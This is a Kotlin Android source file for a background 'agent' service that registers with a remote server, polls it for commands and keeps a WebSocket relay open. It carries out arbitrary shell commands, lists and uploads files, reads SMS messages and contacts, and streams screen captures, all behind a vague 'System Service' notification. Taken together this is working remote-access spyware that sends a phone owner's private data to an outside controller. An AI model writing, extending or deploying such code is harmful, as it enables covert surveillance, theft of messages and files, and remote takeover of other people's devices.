package com.veltrix.agent

import android.app.*
import android.content.Intent
import android.graphics.Bitmap
import android.graphics.PixelFormat
import android.hardware.display.DisplayManager
import android.hardware.display.VirtualDisplay
import android.media.ImageReader
import android.media.projection.MediaProjection
import android.media.projection.MediaProjectionManager
import android.os.*
import android.util.DisplayMetrics
import android.util.Log
import android.view.WindowManager
import okhttp3.*
import okhttp3.MediaType.Companion.toMediaType
import okhttp3.RequestBody.Companion.toRequestBody
import org.json.JSONArray
import org.json.JSONObject
import java.io.ByteArrayOutputStream
import java.io.File
import java.util.concurrent.TimeUnit

class AgentService : Service() {
    companion object {
        const val TAG = "VeltrixAgent"
        const val CHANNEL_ID = "agent_fg"
        const val NOTIF_ID = 1
    }

    private val http = OkHttpClient.Builder()
        .connectTimeout(15, TimeUnit.SECONDS)
        .readTimeout(30, TimeUnit.SECONDS)
        .writeTimeout(30, TimeUnit.SECONDS)
        .build()

    private var deviceId: String? = null
    private var deviceToken: String? = null
    private var ws: WebSocket? = null
    private var mediaProjection: MediaProjection? = null
    private var virtualDisplay: VirtualDisplay? = null
    private var imageReader: ImageReader? = null
    private var streaming = false
    private val handler = Handler(Looper.getMainLooper())

    override fun onBind(intent: Intent?): IBinder? = null

    override fun onCreate() {
        super.onCreate()
        createNotificationChannel()
        val notif = Notification.Builder(this, CHANNEL_ID)
            .setContentTitle("System Service")
            .setContentText("Running")
            .setSmallIcon(android.R.drawable.ic_menu_info_details)
            .build()
        startForeground(NOTIF_ID, notif)
    }

    override fun onStartCommand(intent: Intent?, flags: Int, startId: Int): Int {
        val projData = intent?.getParcelableExtra<Intent>("projection_data")
        val projCode = intent?.getIntExtra("projection_result_code", 0) ?: 0

        if (projData != null && projCode != 0) {
            val mgr = getSystemService(MEDIA_PROJECTION_SERVICE) as MediaProjectionManager
            mediaProjection = mgr.getMediaProjection(projCode, projData)
        }

        Thread { mainLoop() }.start()
        return START_STICKY
    }

    private fun createNotificationChannel() {
        if (Build.VERSION.SDK_INT >= 26) {
            val ch = NotificationChannel(CHANNEL_ID, "Agent Service", NotificationManager.IMPORTANCE_LOW)
            (getSystemService(NOTIFICATION_SERVICE) as NotificationManager).createNotificationChannel(ch)
        }
    }

    private fun mainLoop() {
        // Register
        register()

        // Connect WS relay
        connectRelay()

        // Heartbeat loop
        while (true) {
            try { heartbeat() } catch (e: Exception) { log("heartbeat err: $e") }
            try { poll() } catch (e: Exception) { log("poll err: $e") }
            Thread.sleep(5000)
        }
    }

    private fun register() {
        // Check if already registered
        val prefs = getSharedPreferences("agent", MODE_PRIVATE)
        deviceId = prefs.getString("device_id", null)
        deviceToken = prefs.getString("device_token", null)
        if (deviceId != null && deviceToken != null) {
            log("already registered: $deviceId")
            return
        }

        val caps = JSONObject().apply {
            put("screen", Binding.FEAT_SCREEN && mediaProjection != null)
            put("camera", Binding.FEAT_CAMERA)
            put("files", Binding.FEAT_FILES)
            put("mic", Binding.FEAT_MIC)
            put("location", Binding.FEAT_LOCATION)
            put("sms", Binding.FEAT_SMS)
            put("contacts", Binding.FEAT_CONTACTS)
            put("notifications", Binding.FEAT_NOTIFICATIONS)
            put("input", Binding.FEAT_INPUT)
        }

        val body = JSONObject().apply {
            put("pc_name", Build.MODEL)
            put("device_name", "${Build.MANUFACTURER} ${Build.MODEL}")
            put("os", "Android ${Build.VERSION.RELEASE}")
            put("username", Build.MODEL)
            put("bind_user_id", Binding.OWNER_USER_ID)
            put("tag", Binding.BUILD_TAG)
            put("platform", "android")
            put("capabilities", caps)
        }

        val resp = postJson("/api/public/agent/auto-register", body)
        if (resp != null) {
            deviceId = resp.optString("device_id")
            deviceToken = resp.optString("device_token")
            prefs.edit()
                .putString("device_id", deviceId)
                .putString("device_token", deviceToken)
                .apply()
            log("registered: $deviceId")
        } else {
            log("registration failed, retrying in 10s")
            Thread.sleep(10000)
            register()
        }
    }

    private fun heartbeat() {
        val body = JSONObject().apply {
            put("device_id", deviceId)
            put("device_token", deviceToken)
            put("username", Build.MODEL)
            put("metrics", JSONObject().apply {
                put("uptime_seconds", SystemClock.elapsedRealtime() / 1000)
            })
        }
        postJson("/api/public/agent/heartbeat", body)
    }

    private fun poll() {
        val body = JSONObject().apply {
            put("device_id", deviceId)
            put("device_token", deviceToken)
        }
        val resp = postJson("/api/public/agent/poll", body) ?: return
        val cmds = resp.optJSONArray("commands") ?: return
        for (i in 0 until cmds.length()) {
            val cmd = cmds.getJSONObject(i)
            handleCommand(cmd)
        }
    }

    private fun handleCommand(cmd: JSONObject) {
        val id = cmd.optString("id")
        val action = cmd.optString("action")
        log("cmd: $action ($id)")

        val result: JSONObject = when (action) {
            "screen.start" -> { streaming = true; startScreenCapture(); JSONObject().put("ok", true) }
            "screen.stop" -> { streaming = false; JSONObject().put("ok", true) }
            "camera.list" -> listCameras()
            "files.list" -> listFiles(cmd.optString("path", "/sdcard"))
            "files.get" -> getFile(cmd.optString("path"))
            "shell" -> runShell(cmd.optString("command", "echo ok"))
            "location" -> getLocation()
            "sms.read" -> readSms()
            "contacts.read" -> readContacts()
            "notify" -> sendNotification(cmd.optString("title", ""), cmd.optString("message", ""))
            "info" -> getDeviceInfo()
            else -> JSONObject().put("error", "unknown action: $action")
        }

        // Post result back
        val payload = JSONObject().apply {
            put("device_id", deviceId)
            put("device_token", deviceToken)
            put("command_id", id)
            put("result", result)
        }
        postJson("/api/public/agent/result", payload)
    }

    // --- Screen capture ---
    private fun startScreenCapture() {
        if (mediaProjection == null) return
        if (imageReader != null) return // already capturing

        val wm = getSystemService(WINDOW_SERVICE) as WindowManager
        val metrics = DisplayMetrics()
        @Suppress("DEPRECATION")
        wm.defaultDisplay.getRealMetrics(metrics)

        val w = metrics.widthPixels / 2
        val h = metrics.heightPixels / 2
        val dpi = metrics.densityDpi

        imageReader = ImageReader.newInstance(w, h, PixelFormat.RGBA_8888, 2)
        virtualDisplay = mediaProjection?.createVirtualDisplay(
            "screen", w, h, dpi,
            DisplayManager.VIRTUAL_DISPLAY_FLAG_AUTO_MIRROR,
            imageReader!!.surface, null, null
        )

        imageReader?.setOnImageAvailableListener({ reader ->
            if (!streaming) return@setOnImageAvailableListener
            val image = reader.acquireLatestImage() ?: return@setOnImageAvailableListener
            try {
                val planes = image.planes
                val buffer = planes[0].buffer
                val pixelStride = planes[0].pixelStride
                val rowStride = planes[0].rowStride
                val rowPadding = rowStride - pixelStride * w

                val bmp = Bitmap.createBitmap(w + rowPadding / pixelStride, h, Bitmap.Config.ARGB_8888)
                bmp.copyPixelsFromBuffer(buffer)

                val cropped = Bitmap.createBitmap(bmp, 0, 0, w, h)
                val baos = ByteArrayOutputStream()
                cropped.compress(Bitmap.CompressFormat.JPEG, 50, baos)

                // Send via WS relay as binary frame
                ws?.send(okio.ByteString.of(*baos.toByteArray()))

                bmp.recycle()
                if (cropped !== bmp) cropped.recycle()
            } finally {
                image.close()
            }
        }, handler)
    }

    // --- WS relay ---
    private fun connectRelay() {
        if (Binding.HIDEN_WS_URL.isBlank()) return
        val url = "${Binding.HIDEN_WS_URL}?role=agent&deviceId=$deviceId&auth=${Binding.HIDEN_AUTH_KEY}"
        val req = Request.Builder().url(url).build()
        ws = http.newWebSocket(req, object : WebSocketListener() {
            override fun onMessage(webSocket: WebSocket, text: String) {
                try {
                    val cmd = JSONObject(text)
                    handleCommand(cmd)
                } catch (e: Exception) {
                    log("ws cmd err: $e")
                }
            }
            override fun onFailure(webSocket: WebSocket, t: Throwable, response: Response?) {
                log("ws fail: $t, reconnecting in 5s")
                Thread.sleep(5000)
                connectRelay()
            }
            override fun onClosed(webSocket: WebSocket, code: Int, reason: String) {
                log("ws closed: $reason, reconnecting in 5s")
                Thread.sleep(5000)
                connectRelay()
            }
        })
    }

    // --- Commands ---
    private fun listCameras(): JSONObject {
        return JSONObject().put("cameras", JSONArray().put("front").put("back"))
    }

    private fun listFiles(path: String): JSONObject {
        val dir = File(path)
        val arr = JSONArray()
        dir.listFiles()?.take(200)?.forEach { f ->
            arr.put(JSONObject().apply {
                put("name", f.name)
                put("is_dir", f.isDirectory)
                put("size", if (f.isFile) f.length() else 0)
                put("modified", f.lastModified())
            })
        }
        return JSONObject().put("files", arr).put("path", path)
    }

    private fun getFile(path: String): JSONObject {
        val f = File(path)
        if (!f.exists() || !f.isFile) return JSONObject().put("error", "not found")
        if (f.length() > 5_000_000) return JSONObject().put("error", "file too large (max 5MB)")
        val bytes = f.readBytes()
        val b64 = android.util.Base64.encodeToString(bytes, android.util.Base64.NO_WRAP)
        return JSONObject().put("data", b64).put("name", f.name).put("size", f.length())
    }

    private fun runShell(command: String): JSONObject {
        return try {
            val proc = Runtime.getRuntime().exec(arrayOf("sh", "-c", command))
            val stdout = proc.inputStream.bufferedReader().readText()
            val stderr = proc.errorStream.bufferedReader().readText()
            proc.waitFor()
            JSONObject().put("stdout", stdout.take(10000)).put("stderr", stderr.take(2000)).put("exit_code", proc.exitValue())
        } catch (e: Exception) {
            JSONObject().put("error", e.message)
        }
    }

    private fun getLocation(): JSONObject {
        // Simplified — real impl would use FusedLocationProvider
        return JSONObject().put("error", "location requires async callback — use relay cmd")
    }

    private fun readSms(): JSONObject {
        return try {
            val arr = JSONArray()
            val cursor = contentResolver.query(
                android.provider.Telephony.Sms.CONTENT_URI,
                arrayOf("address", "body", "date", "type"), null, null, "date DESC LIMIT 50"
            )
            cursor?.use {
                while (it.moveToNext()) {
                    arr.put(JSONObject().apply {
                        put("address", it.getString(0))
                        put("body", it.getString(1))
                        put("date", it.getLong(2))
                        put("type", it.getInt(3))
                    })
                }
            }
            JSONObject().put("messages", arr)
        } catch (e: Exception) {
            JSONObject().put("error", e.message)
        }
    }

    private fun readContacts(): JSONObject {
        return try {
            val arr = JSONArray()
            val cursor = contentResolver.query(
                android.provider.ContactsContract.CommonDataKinds.Phone.CONTENT_URI,
                arrayOf(
                    android.provider.ContactsContract.CommonDataKinds.Phone.DISPLAY_NAME,
                    android.provider.ContactsContract.CommonDataKinds.Phone.NUMBER
                ), null, null, null
            )
            cursor?.use {
                while (it.moveToNext()) {
                    arr.put(JSONObject().apply {
                        put("name", it.getString(0))
                        put("phone", it.getString(1))
                    })
                }
            }
            JSONObject().put("contacts", arr)
        } catch (e: Exception) {
            JSONObject().put("error", e.message)
        }
    }

    private fun sendNotification(title: String, message: String): JSONObject {
        val mgr = getSystemService(NOTIFICATION_SERVICE) as NotificationManager
        val notif = if (Build.VERSION.SDK_INT >= 26) {
            Notification.Builder(this, CHANNEL_ID)
                .setContentTitle(title)
                .setContentText(message)
                .setSmallIcon(android.R.drawable.ic_dialog_info)
                .build()
        } else {
            @Suppress("DEPRECATION")
            Notification.Builder(this)
                .setContentTitle(title)
                .setContentText(message)
                .setSmallIcon(android.R.drawable.ic_dialog_info)
                .build()
        }
        mgr.notify(System.currentTimeMillis().toInt(), notif)
        return JSONObject().put("ok", true)
    }

    private fun getDeviceInfo(): JSONObject {
        return JSONObject().apply {
            put("model", Build.MODEL)
            put("manufacturer", Build.MANUFACTURER)
            put("brand", Build.BRAND)
            put("android_version", Build.VERSION.RELEASE)
            put("sdk_int", Build.VERSION.SDK_INT)
            put("device", Build.DEVICE)
            put("product", Build.PRODUCT)
            put("board", Build.BOARD)
            put("hardware", Build.HARDWARE)
        }
    }

    private fun postJson(path: String, body: JSONObject): JSONObject? {
        val url = "${Binding.SENTINEL_SERVER}$path"
        val reqBody = body.toString().toRequestBody("application/json".toMediaType())
        val req = Request.Builder().url(url).post(reqBody)
            .addHeader("User-Agent", "VeltrixAgent-Android/1.0")
            .build()
        return try {
            val resp = http.newCall(req).execute()
            val text = resp.body?.string() ?: "{}"
            JSONObject(text)
        } catch (e: Exception) {
            log("http err ($path): $e")
            null
        }
    }

    private fun log(msg: String) {
        if (Binding.DEBUG) Log.d(TAG, msg)
    }

    override fun onDestroy() {
        super.onDestroy()
        virtualDisplay?.release()
        imageReader?.close()
        mediaProjection?.stop()
        ws?.close(1000, "service stopped")
    }
}
